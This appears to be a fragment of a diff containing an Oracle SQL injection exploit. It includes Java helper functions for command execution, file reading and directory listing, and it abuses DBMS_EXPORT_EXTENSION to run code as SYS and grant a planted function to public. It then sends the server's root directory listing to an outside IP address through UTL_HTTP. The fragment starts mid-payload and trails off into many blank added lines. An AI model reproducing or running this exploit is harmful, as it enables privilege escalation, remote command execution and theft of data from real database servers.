+　　public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}
+　　public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}
+　　public static String openDir(String dir) {String str = "";File file = new File(dir); String[] filelist = file.list(); for (int i = 0; i < filelist.length; i++) str += filelist + (char)0xa;return str;}}'''';END;'';END;--','SYS',0,'1',0) from dual　　)
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''
+　　create or replace function LinxOpenDir(filename in varchar2)  return varchar2  as language java name ''''''''LinxUtil.openDir(java.lang.String) return String'''''''';   '''';END;'';END;--','SYS',0,'1',0) from dual
+　　select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxOpenDir to public'''';END;'';END;--','SYS',0,'1',0) from dual
+　　select  sys.LinxOpenDir('/') from dual
+　　SELECT UTL_HTTP.request('http://211.71.147.3/record.php?a=LinxOpenDir:'||REPLACE(REPLACE(sys.LinxOpenDir('/'),' ','%20'),chr(10),'%0A')) FROM dual
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
